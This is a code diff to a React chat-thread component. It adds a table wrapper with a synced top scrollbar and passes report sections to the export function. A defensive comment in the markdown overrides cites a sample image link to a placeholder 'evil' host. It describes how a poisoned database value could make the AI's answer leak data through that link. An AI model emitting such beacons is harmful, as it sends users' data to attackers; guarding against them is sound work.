@@ -7,10 +7,76 @@ import { Widget } from '../SandboxedWidget'
 import { exportRows, exportDashboard, exportData } from '../api'
 import DateRangePicker from './DateRangePicker'
 
+/*
+ * ScrollableTable — a wide result table with a scrollbar ABOVE it as well as
+ * below. GIA/report tables run well past the panel width, and with only the
+ * native bottom scrollbar the user had to scroll to the end of a long table
+ * before discovering the columns continued to the right. The top bar is a
+ * plain empty strip whose scroll position is mirrored to the table, so the
+ * hidden columns are reachable without leaving the top of the result.
+ *
+ * It renders ONLY when the table actually overflows, so narrow tables (the
+ * common case) look exactly as before.
+ */
+function ScrollableTable(props) {
+  const topRef = useRef(null)
+  const bodyRef = useRef(null)
+  const [scrollW, setScrollW] = useState(0)
+  const [clientW, setClientW] = useState(0)
+
+  useEffect(() => {
+    const body = bodyRef.current
+    if (!body) return undefined
+    const measure = () => {
+      setScrollW(body.scrollWidth)
+      setClientW(body.clientWidth)
+    }
+    measure()
+    // Re-measure when the panel resizes or the table's own width changes
+    // (streamed answers grow the table after the first paint).
+    const ro = new ResizeObserver(measure)
+    ro.observe(body)
+    const table = body.querySelector('table')
+    if (table) ro.observe(table)
+    return () => ro.disconnect()
+  }, [])
+
+  // +1px guard: sub-pixel layout rounding otherwise shows a scrollbar on
+  // tables that fit exactly.
+  const overflows = scrollW > clientW + 1
+
+  // Mirror one scroller onto the other. Assigning an unchanged scrollLeft
+  // fires no scroll event, so the two cannot loop.
+  const syncFromTop = () => {
+    if (topRef.current && bodyRef.current) bodyRef.current.scrollLeft = topRef.current.scrollLeft
+  }
+  const syncFromBody = () => {
+    if (topRef.current && bodyRef.current) topRef.current.scrollLeft = bodyRef.current.scrollLeft
+  }
+
+  return (
+    <div className="table-block">
+      {overflows && (
+        <div
+          ref={topRef}
+          className="table-scroll-top"
+          onScroll={syncFromTop}
+          aria-hidden="true"
+        >
+          <div style={{ width: scrollW }} />
+        </div>
+      )}
+      <div ref={bodyRef} className="table-wrap" onScroll={syncFromBody}>
+        <table {...props} />
+      </div>
+    </div>
+  )
+}
+
 // Markdown overrides: open links safely; let wide result tables scroll.
 const MD_COMPONENTS = {
   a: ({ node, ...props }) => <a target="_blank" rel="noopener noreferrer" {...props} />,
-  table: ({ node, ...props }) => <div className="table-wrap"><table {...props} /></div>,
+  table: ({ node, ...props }) => <ScrollableTable {...props} />,
   // Do NOT auto-load markdown images. Answers are text/tables (real visuals go
   // through the sandboxed widget path), so a `![](https://evil/?leak=…)` that a
   // poisoned DB value slipped into the answer would just be an exfil beacon.
@@ -120,6 +186,7 @@ export default function Thread({ messages, isStreaming, status, composerProps, o
                           <ExportControl
                             columns={m.exportColumns}
                             rows={m.exportRows}
+                            sections={m.exportSections}
                             dashboard={m.widgets?.find((w) => w.kind === 'dashboard' && w.data)?.data}
                             truncated={!!m.exportTruncated}
                             exportQuery={m.exportQuery}
@@ -162,7 +229,7 @@ export default function Thread({ messages, isStreaming, status, composerProps, o
 //              a trimmed snapshot must never masquerade as the full download.
 //   Dashboard: the whole dashboard (KPIs + every chart section + its data)
 //              via /export_dashboard. A dashboard turn offers BOTH groups.
-function ExportControl({ columns, rows, dashboard, truncated, exportQuery }) {
+function ExportControl({ columns, rows, dashboard, truncated, exportQuery, sections }) {
   const [busy, setBusy] = useState(null) // 'data-excel' | 'dash-pdf' | ... | null
 
   async function run(kind, format) {
@@ -176,7 +243,7 @@ function ExportControl({ columns, rows, dashboard, truncated, exportQuery }) {
         // Stored snapshot is incomplete -> re-run the exact query for full data.
         await exportData(exportQuery, format)
       } else {
-        await exportRows(columns || [], rows || [], format)
+        await exportRows(columns || [], rows || [], format, 'Report', sections || [])
       }
     } catch {
       alert('Export failed — please try again in a moment.')
